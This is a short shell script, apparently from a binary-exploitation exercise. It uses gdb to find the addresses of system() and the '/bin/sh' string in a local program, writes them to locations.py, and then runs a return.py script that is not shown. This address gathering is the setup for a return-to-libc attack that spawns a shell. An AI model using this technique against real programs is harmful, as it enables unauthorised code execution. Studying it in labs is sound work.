system=`echo "break main\nr\nprint system" | gdb ./main | grep system | awk '{print $9}'` 2>/dev/null
binbash=`echo "break main\nr\nfind &system,+9999999,\"/bin/sh\"" | gdb ./main | grep 0x | awk '{print $2}' | grep 0x` 2>/dev/null

echo "system=\"$system\"" 	> locations.py
echo "binbash=\"$binbash\"" >> locations.py

python2.7 return.py
